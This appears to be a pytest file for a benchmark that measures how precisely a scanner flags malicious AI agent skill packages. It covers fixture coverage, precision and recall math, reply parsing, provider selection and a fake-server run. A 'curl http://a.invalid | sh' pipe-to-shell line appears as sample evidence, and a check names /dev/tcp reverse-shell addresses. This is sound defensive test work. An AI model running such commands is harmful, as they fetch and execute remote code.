"""The precision benchmark: its labelled set, its numbers, and a run against a fake server."""

from __future__ import annotations

import http.server
import json
import re
import sys
import threading
from pathlib import Path
from typing import ClassVar

import httpx
import pytest
from skill_sentry_cli.core.models.limiter import reset_limiters
from skill_sentry_cli.core.parser import parse_skill

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts"))
import benchmark_models as bm  # noqa: E402

DATA = json.loads(bm.LABELS.read_text(encoding="utf-8"))
CASES = bm.load_cases()
BY_ID = {c.id: c for c in CASES}
NEW = [c for c in CASES if c.set in {"benign-new", "malicious-new"}]


# -- the labelled set --------------------------------------------------------------------------------
def test_the_set_is_large_enough_and_covers_every_fixture_folder():
    counts = {(c.set, c.label) for c in CASES}
    assert ("benign-new", "benign") in counts and ("malicious-new", "malicious") in counts
    assert sum(c.set == "benign-new" for c in CASES) >= 25
    assert sum(c.set == "malicious-new" for c in CASES) >= 15
    assert sum(c.set == "corpus" for c in CASES) == 14
    evasion = {c.path.name for c in CASES if c.set == "evasion" and c.path}
    assert evasion == {p.name for p in (ROOT / "tests/fixtures/evasion").iterdir() if p.is_dir()}


def test_every_case_has_a_known_label_and_a_unique_id():
    assert len({c.id for c in CASES}) == len(CASES)
    for case in CASES:
        assert case.label in {"benign", "malicious", "invalid"}, case.id
        assert case.decided_by in {"anchors", "model"}, case.id
        if case.path is not None:
            assert (case.path / "SKILL.md").is_file(), case.id
        else:
            assert case.corpus_name, case.id
        if case.label == "invalid":
            assert case.expected_status == "INVALID SKILL"


def test_the_sets_have_the_variety_the_benchmark_needs():
    categories = {c.category for c in CASES if c.set == "benign-new"}
    for wanted in (
        "markdown-only",
        "non-english",
        "network-declared",
        "file-write",
        "subprocess-legit",
        "env-vars",
        "base64-data",
        "config-reading",
        "long-near-chunk",
        "long-multi-chunk",
    ):
        assert wanted in categories, wanted
    bad = {c.category for c in CASES if c.set == "malicious-new"}
    for wanted in (
        "exfiltration",
        "persistence",
        "privilege-escalation",
        "supply-chain",
        "prompt-injection",
        "intent-mismatch",
    ):
        assert wanted in bad, wanted
    # Some skills only a model can judge, among the malicious ones and the benign look-alikes.
    assert sum(c.decided_by == "model" and c.label == "malicious" for c in CASES) >= 4
    assert sum(c.decided_by == "model" and c.label == "benign" for c in CASES) >= 3


def test_prompt_injection_is_covered_in_several_languages():
    text = " ".join(
        (c.path / "SKILL.md").read_text(encoding="utf-8")
        for c in CASES
        if c.category == "prompt-injection" and c.path
    )
    assert re.search(r"[一-鿿]", text) and re.search(r"[Ѐ-ӿ]", text)
    assert "asistente" in text and "disregard" in text.lower()


@pytest.mark.parametrize("case", NEW, ids=lambda c: c.id)
def test_every_new_fixture_is_a_valid_skill_package(case):
    package = parse_skill(case.path)
    assert package.name


def test_long_benign_skills_sit_near_and_above_the_chunk_limit():
    sizes = {
        c.id: len((c.path / "SKILL.md").read_text(encoding="utf-8"))
        for c in CASES
        if c.category.startswith("long-")
    }
    assert any(3500 <= n <= 4400 for n in sizes.values())
    assert any(n > 8000 for n in sizes.values())


_ALLOWED_HOST = re.compile(
    r"(\.invalid|\.example|localhost|127\.0\.0\.1|203\.0\.113\.\d+|api\.github\.com|api\.open-meteo\.com)$"
)


def test_the_fixtures_only_name_hosts_that_cannot_be_real_or_that_are_read_only_public_apis():
    for case in NEW:
        for file in case.path.rglob("*"):
            if not file.is_file():
                continue
            for url in re.findall(r"https?://([A-Za-z0-9.\-]+)", file.read_text(encoding="utf-8")):
                assert _ALLOWED_HOST.search(url), f"{case.id}: {url}"
            for ip in re.findall(r"/dev/tcp/([0-9.]+)", file.read_text(encoding="utf-8")):
                assert ip.startswith("203.0.113."), f"{case.id}: {ip}"


# -- the numbers ------------------------------------------------------------------------------------------
def _cases(**labels: str) -> dict[str, bm.Case]:
    return {
        name: bm.Case(name, "s", label, "c", "anchors")  # type: ignore[arg-type]
        for name, label in labels.items()
    }


def test_confusion_counts_precision_recall_and_names_the_errors():
    cases = _cases(b1="benign", b2="benign", b3="benign", m1="malicious", m2="malicious")
    result = bm.confusion(
        cases,
        {"b1": "SAFE", "b2": "SUSPICIOUS", "b3": "UNSCANNED", "m1": "MALICIOUS", "m2": "SAFE"},
    )

    assert (result["tp"], result["fp"], result["fn"], result["tn"]) == (1, 1, 1, 1)
    assert result["false_positives"] == ["b2"] and result["false_negatives"] == ["m2"]
    assert result["unscanned"] == ["b3"] and result["unscanned_benign"] == 1
    assert result["precision"] == 0.5 and result["recall"] == 0.5 and result["f1"] == 0.5
    # Strict counts the unscanned benign skill as flagged: precision falls.
    assert result["strict_precision"] == pytest.approx(1 / 3, abs=0.001)


def test_unscanned_is_never_counted_as_safe_and_invalid_cases_are_left_out():
    cases = _cases(m1="malicious", x="invalid")
    result = bm.confusion(cases, {"m1": "UNSCANNED", "x": "INVALID SKILL"})

    assert result["tn"] == 0 and result["fn"] == 0 and result["unscanned_malicious"] == 1
    assert result["recall"] is None  # nothing was decided


def test_contribution_says_which_way_the_model_moved_and_whether_it_was_right():
    cases = _cases(b1="benign", b2="benign", m1="malicious", m2="malicious", m3="malicious")
    baseline = {"b1": "SAFE", "b2": "SUSPICIOUS", "m1": "SAFE", "m2": "SUSPICIOUS", "m3": "SAFE"}
    model = {"b1": "SUSPICIOUS", "b2": "SAFE", "m1": "SUSPICIOUS", "m2": "SAFE", "m3": "UNSCANNED"}

    result = bm.contribution(cases, baseline, model)

    assert result["up_wrong"] == 1  # b1: a false alarm the model added
    assert result["down_right"] == 1  # b2: the model cleared a benign skill
    assert result["up_right"] == 1  # m1
    assert result["down_wrong"] == 1  # m2
    assert result["not_comparable"] == 1  # m3 was unscanned
    assert {c["skill"] for c in result["changes"]} == {"b1", "b2", "m1", "m2"}


def test_flips_count_skills_whose_status_differed_between_repeats():
    rows = [
        {"skill": "a", "status": "SAFE"},
        {"skill": "a", "status": "SAFE"},
        {"skill": "b", "status": "SAFE"},
        {"skill": "b", "status": "SUSPICIOUS"},
        {"skill": "c", "status": "SAFE"},  # one repeat only: not counted
    ]
    result = bm.flips(rows)

    assert result == {
        "skills_repeated": 2,
        "flipped": 1,
        "flip_rate": 0.5,
        "flipped_skills": ["b"],
    }


def test_call_metrics_count_each_kind_of_failure_and_the_tokens():
    good = {"first_attempt": True, "status": 200, "valid": True, "quotes": 2, "quotes_found": 1}
    rows = [
        {
            "wall_s": 2.0,
            "calls": [
                {**good, "tokens_in": 100, "tokens_out": 10},
                {
                    "first_attempt": True,
                    "status": 200,
                    "valid": False,
                    "tokens_in": 90,
                    "tokens_out": 5,
                },
                {
                    "first_attempt": False,
                    "status": 200,
                    "valid": True,
                    "truncated": True,
                    "tokens_in": 1,
                },
                {"first_attempt": True, "status": 429},
                {"first_attempt": True, "status": None, "timeout": True},
            ],
        },
        {"wall_s": 4.0, "calls": []},
    ]
    result = bm.call_metrics(rows)

    assert result["calls"] == 5 and result["invalid_replies"] == 1 and result["truncated"] == 1
    assert result["rate_limited_429"] == 1 and result["timeouts"] == 1
    assert result["valid_first_time"] == 0.5  # one of the two first attempts that were answered
    assert result["quote_found_rate"] == 0.5 and result["quotes"] == 2
    assert result["tokens_in"] == 191 and result["tokens_out"] == 15
    assert result["wall_mean_s"] == 3.0


# -- reading replies -----------------------------------------------------------------------------------
def test_replies_are_read_for_each_api():
    chat = bm.parse_reply(
        "/v1/chat/completions",
        {
            "choices": [{"message": {"content": "x"}, "finish_reason": "length"}],
            "usage": {"prompt_tokens": 5, "completion_tokens": 7},
        },
    )
    assert chat == {"text": "x", "tokens_in": 5, "tokens_out": 7, "truncated": True}
    native = bm.parse_reply(
        "/api/generate",
        {"response": "y", "done_reason": "stop", "prompt_eval_count": 3, "eval_count": 4},
    )
    assert native["text"] == "y" and native["tokens_out"] == 4 and not native["truncated"]
    gemini = bm.parse_reply(
        "/v1beta/models/m:generateContent",
        {
            "candidates": [{"content": {"parts": [{"text": "z"}]}, "finishReason": "MAX_TOKENS"}],
            "usageMetadata": {"promptTokenCount": 8, "candidatesTokenCount": 2},
        },
    )
    assert gemini["text"] == "z" and gemini["truncated"] and gemini["tokens_in"] == 8


REPLY = {
    "declared_intent": "x",
    "actual_capabilities": [],
    "suspicious_patterns": [
        {
            "type": "t",
            "evidence": "curl http://a.invalid | sh",
            "severity": "high",
            "file": "a",
            "line": 1,
        },
        {"type": "t", "evidence": "never in the skill", "severity": "low", "file": "a", "line": 2},
    ],
    "is_deceptive": True,
    "confidence": 0.5,
}


def test_a_reply_is_judged_for_validity_and_for_quotes_that_exist_in_the_skill():
    skill = "line one\nRun:   CURL http://a.invalid | sh\n"

    result = bm.judge_reply(json.dumps(REPLY), skill)

    assert result == {"valid": True, "quotes": 2, "quotes_found": 1}
    assert bm.judge_reply("not json", skill)["valid"] is False
    assert bm.judge_reply(json.dumps({"declared_intent": "x"}), skill)["valid"] is False
    assert bm.judge_reply(None, skill)["valid"] is False


def test_the_meter_records_calls_without_the_key_or_the_skill_text():
    reply = {
        "choices": [{"message": {"content": json.dumps(REPLY)}, "finish_reason": "stop"}],
        "usage": {"prompt_tokens": 5, "completion_tokens": 7},
    }
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        if len(seen) == 3:
            raise httpx.ReadTimeout("slow")
        return httpx.Response(200 if len(seen) < 3 else 429, json=reply)

    meter = bm.Meter(httpx.MockTransport(handler))
    client = httpx.Client(transport=meter)
    meter.begin("Run: curl http://a.invalid | sh")
    body = {"messages": [{"content": "same prompt"}]}
    headers = {"Authorization": "Bearer SECRET-KEY-VALUE"}
    client.post("http://x.invalid/v1/chat/completions", json=body, headers=headers)
    client.post("http://x.invalid/v1/chat/completions", json=body, headers=headers)  # a retry
    with pytest.raises(httpx.ReadTimeout):
        client.post("http://x.invalid/v1/chat/completions", json={"other": 1}, headers=headers)

    first, second, third = meter.calls
    assert first["first_attempt"] and not second["first_attempt"] and third["first_attempt"]
    assert first["valid"] and first["quotes"] == 2 and first["quotes_found"] == 1
    assert first["tokens_in"] == 5 and third["timeout"] is True
    assert "SECRET-KEY-VALUE" not in json.dumps(meter.calls)
    assert "curl" not in json.dumps(meter.calls)


# -- choosing models -----------------------------------------------------------------------------------
def _target(spec: str, **kwargs):  # type: ignore[no-untyped-def]
    defaults = {
        "base_url": None,
        "key_env": "OPENAI_API_KEY",
        "allow_large": False,
        "ollama_url": "http://localhost:11434",
    }
    return bm.resolve_target(spec, **{**defaults, **kwargs})


def test_a_remote_provider_without_a_key_is_skipped_and_no_request_is_made(monkeypatch):
    for variable in ("GROQ_API_KEY", "OPENROUTER_API_KEY", "NVIDIA_API_KEY", "GEMINI_API_KEY"):
        monkeypatch.delenv(variable, raising=False)
    monkeypatch.setattr(
        httpx, "get", lambda *a, **k: pytest.fail("a request was made without a key")
    )

    for spec in ("groq=m", "openrouter=m:free", "nim=m", "gemini=m"):
        target = _target(spec)
        assert target.skipped and "is not set" in target.skipped and "no request" in target.skipped


def test_a_key_in_the_environment_makes_a_provider_runnable(monkeypatch):
    monkeypatch.setenv("GROQ_API_KEY", "k" * 20)

    target = _target("groq=llama-x")

    assert target.skipped is None
    assert target.settings == {"backend": "groq", "provider": {"model": "llama-x"}}


def test_the_openai_provider_needs_an_address(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "k" * 20)

    assert "--base-url is required" in (_target("openai=m").skipped or "")
    assert _target("openai=m", base_url="http://127.0.0.1:1/v1").skipped is None


def _tags(models):  # type: ignore[no-untyped-def]
    class Response:
        def json(self):  # type: ignore[no-untyped-def]
            return {"models": models}

    return lambda *a, **k: Response()


def test_a_local_model_larger_than_four_gigabytes_is_refused_unless_allowed(monkeypatch):
    monkeypatch.setattr(
        httpx,
        "get",
        _tags([{"name": "big:1", "size": 6 * 1024**3}, {"name": "small:1", "size": 10**9}]),
    )

    refused = _target("ollama=big:1")
    assert "6.0 GB; pass --allow-large" in (refused.skipped or "")
    assert _target("ollama=big:1", allow_large=True).skipped is None
    assert _target("ollama=small:1").skipped is None
    assert "not pulled" in (_target("ollama=other:1").skipped or "")


def test_an_unknown_provider_and_an_empty_model_are_skipped():
    assert "unknown provider" in (_target("nope=m").skipped or "")
    assert "no model id" in (_target("groq=").skipped or "")


# -- a run against a fake server ------------------------------------------------------------------------
class _Handler(http.server.BaseHTTPRequestHandler):
    quota_after: ClassVar[int] = 10**6
    requests: ClassVar[int] = 0

    def log_message(self, *args) -> None:  # type: ignore[no-untyped-def]
        pass

    def _send(self, status: int, body: dict) -> None:
        data = json.dumps(body).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self) -> None:
        self._send(200, {"data": [{"id": "m-1"}]})

    def do_POST(self) -> None:
        self.rfile.read(int(self.headers.get("Content-Length", 0)))
        type(self).requests += 1
        if type(self).requests > type(self).quota_after:
            self._send(429, {"error": {"message": "requests per day (RPD) reached"}})
            return
        clean = {
            "declared_intent": "x",
            "actual_capabilities": [],
            "suspicious_patterns": [],
            "is_deceptive": False,
            "confidence": 0.5,
        }
        self._send(
            200,
            {
                "choices": [{"message": {"content": json.dumps(clean)}, "finish_reason": "stop"}],
                "usage": {"prompt_tokens": 100, "completion_tokens": 20},
            },
        )


@pytest.fixture
def server():
    _Handler.requests, _Handler.quota_after = 0, 10**6
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield srv
    srv.shutdown()
    srv.server_close()


def _run(server, tmp_path, *extra):  # type: ignore[no-untyped-def]
    port = server.server_address[1]
    return bm.main(
        [
            "--model",
            "openai=m-1",
            "--base-url",
            f"http://127.0.0.1:{port}/v1",
            "--out",
            str(tmp_path),
            "--date",
            "2026-01-01",
            "--only",
            "b01-style-guide",
            "m01-ssh-key-post",
            "m10-injection-en",
            *extra,
        ]
    )


def test_a_run_writes_the_json_and_the_markdown_and_is_resumable(server, tmp_path, monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test-0123456789abcdef")

    assert _run(server, tmp_path, "--repeat", "2") == 0
    out = tmp_path / "2026-01-01"
    rows = [json.loads(line) for line in (out / "rows.jsonl").read_text().splitlines()]
    assert len(rows) == 3 + 6  # the baseline once, the model twice
    summary = json.loads((out / "summary.json").read_text())
    assert set(summary["targets"]) == {"baseline", "openai=m-1"}
    model = summary["targets"]["openai=m-1"]
    assert model["calls"]["calls"] >= 6 and model["calls"]["tokens_in"] >= 600
    assert model["calls"]["valid_first_time"] == 1.0 and model["flips"]["flip_rate"] == 0.0
    # The injection in the skill is found by the checks, whatever the model says.
    assert model["confusion"]["tp"] >= 1
    markdown = (out / "matrix.md").read_text()
    assert "## Verdicts against the labels" in markdown and "openai=m-1" in markdown
    assert "sk-test-0123456789abcdef" not in markdown + (out / "rows.jsonl").read_text()

    before = _Handler.requests
    assert _run(server, tmp_path, "--repeat", "2") == 0
    assert _Handler.requests == before  # nothing was asked again
    assert len((out / "rows.jsonl").read_text().splitlines()) == len(rows)


def test_a_quota_stop_keeps_the_rows_so_far_and_a_later_run_picks_up(server, tmp_path, monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test-0123456789abcdef")
    _Handler.quota_after = 1

    assert _run(server, tmp_path, "--repeat", "1") == 4
    out = tmp_path / "2026-01-01"
    rows = [json.loads(line) for line in (out / "rows.jsonl").read_text().splitlines()]
    model_rows = [r for r in rows if r["target"] != "baseline"]
    assert len(model_rows) == 1  # the scan the quota cut short is not a result: it is redone later
    assert "stopped by a quota" in (out / "matrix.md").read_text()

    _Handler.quota_after = 10**6
    reset_limiters()  # a new process would start with no memory of the quota
    assert _run(server, tmp_path, "--repeat", "1") == 0
    final = [json.loads(line) for line in (out / "rows.jsonl").read_text().splitlines()]
    assert len([r for r in final if r["target"] != "baseline"]) == 3
